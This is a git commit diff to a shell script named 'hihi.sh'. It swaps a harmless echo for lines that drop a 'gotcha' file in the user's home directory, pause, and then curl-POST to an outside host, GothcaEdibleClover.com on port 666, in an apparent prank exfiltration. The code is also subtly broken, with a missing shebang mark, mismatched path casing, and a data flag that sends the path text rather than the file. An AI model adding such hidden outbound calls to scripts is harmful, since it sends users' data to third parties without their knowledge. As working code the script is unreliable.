a2a28f8032e168212620895f65aa85561f19a86d
EdibleClover <36722535+EdibleClover@users.noreply.github.com>
2022-01-24 19:47:09 -0700

    Update hihi.sh

--- hihi.sh
+++ hihi.sh
@@ -1,3 +1,9 @@
 /bin/bash
 
-echo 'great'
+echo "gotcha :)" >> ~/documents/gotcha.txt
+
+sleep 5
+
+curl -i -X POST GothcaEdibleClover.com:666 \
+  -H "Content-Type: text/xml" \
+  --data-binary "~/Documents/gotcha.txt"
